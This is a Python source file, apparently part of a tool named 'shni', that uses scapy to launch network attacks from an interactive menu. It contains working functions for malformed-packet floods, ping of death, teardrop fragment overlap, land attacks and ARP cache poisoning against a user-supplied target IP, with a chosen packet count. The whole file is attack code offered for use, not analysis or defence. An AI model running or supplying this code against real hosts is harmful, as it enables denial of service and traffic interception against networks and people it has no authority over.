#attack methods for the shni framework
from scapy.all import *
from netaddr import *
from formatting import bcolors
import string

#Intercept signal
import shni_signals
import signal
import sys

from random import randint

#Check for interrupts
interrupted = False

def view_attacks_menu(shni):
		while 1==1:
			os.system('clear')
			print "Shni - Network Attacks"
			print "======================"
			print ""
			print "Menu"
			print "===="
			print "1. Malformed Packets"
			print "2. Ping Of Death"
			print "3. Teardrop (Nestea)"
			print "4. Land attack"
			print "5. ARP Cache Poisoning - Target DOS"

			print " "
			print "x. Exit"
			print ""
			value = raw_input("Select an option from the menu: ")

			if value == 'x':
				break

			if value == '1':
				malformed_packets(shni)

			if value == '2':
				ping_of_death(shni)

			if value == '3':
				teardrop(shni)

			if value == '4':
				land_attack(shni)

			if value == '5':
				arp_cache_poison_dos(shni)



def malformed_packets(shni):
	os.system('clear')
	print "Shni - Malformed Packets"
	print "========================"
	print ""
	target = raw_input("Enter the target IP: ")
	count = raw_input("How many packets should we send? : ")
	for item in range(0,int(count)):
		packets = sr1(IP(dst=target, ihl=2, version=3)/ICMP(), verbose=0, timeout=5)
		print packets
	print " "		
	raw_input("Continue")



def ping_of_death(shni):
	os.system('clear')
	print "Shni - Ping of Death"
	print "===================="
	print ""
	import string
	import random
	
	target = raw_input("Enter the target IP: ")
	count = raw_input("How many packets should we send? : ")
	for i in range(0, int(count)):
		data = packet_generator()
		for p in fragment(IP(dst=target)/ICMP()/(data)):
			send(p, verbose=0)	


	print " "		
	raw_input("Continue")
	

def teardrop(shni):
	os.system('clear')
	print "Shni - Teardrop"
	print "==============="
	print ""
	target = raw_input("Enter the target IP: ")
	count = raw_input("How many packets should we send? : ")
	ipid = RandShort()
	for item in range(0,int(count)):
		MF = 'MF'
		Frag_Size = randint(1,100)
		UDP_Size = randint(1,200)
		load = packet_generator(UDP_Size)
		send(IP(dst=target, id=ipid, flags=MF)/UDP()/(load), verbose=0)
		Load_Size = randint(1,500)
		load = packet_generator(Load_Size)
		send(IP(dst=target, id=ipid, frag=Frag_Size)/(load), verbose=0)

	print " "		
	raw_input("Continue")


def land_attack(shni):
	os.system('clear')
	print "Shni - Land Attack"
	print "=================="
	print ""
	target = raw_input("Enter the target IP: ")
	count = raw_input("How many packets should we send? : ")
	for item in range(0,int(count)):
		sr1(IP(src=target,dst=target)/TCP(sport=135,dport=135,options=[('Timestamp', (342940201, 0))]) , timeout=1)

def arp_cache_poison_dos(shni):
	os.system('clear')
	print "Shni - ARP cache poison"
	print "=================="
	print ""
	arp = ARP()
	victim = raw_input("Enter the victim IP: ")
	cached_ip = raw_input("Cached IP on victim ARP cache to Spoof: ")
	mac = raw_input("MAC address to assign to Cached ip: [%s]: "  % arp.hwsrc  ) 
	pcount = raw_input("How many packets should we send? : ")
	
	if mac.strip() == '':
		arp.hwdst = arp.hwsrc
	else:
		arp.hwdst = mac

	#arp.op = 2 #Arp Reply --- the shit protocol doesn't check if it has acttually asked. it will just accept.
	arp.op = 1 #Arp request --- the shit protocol doesn't check if it has acttually asked. it will just accept.
	arp.psrc = cached_ip
	arp.pdst = victim
	#arp.show()

	print ""
	choice = raw_input("So lets get this straight.\n Tell %s that computer %s own this mac address	%s\n And send this packet %s times?  [y/n]: " % (victim, cached_ip, arp.hwdst, pcount ) ) 
	if choice.lower() == 'y':
		print "Arp Poisoning %s packets " % pcount
		send(arp, inter=1,count=int(pcount), verbose=0)
		print " "
		print "Done!"
	raw_input("Continue")

def packet_generator(size=70000, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for x in range(size))
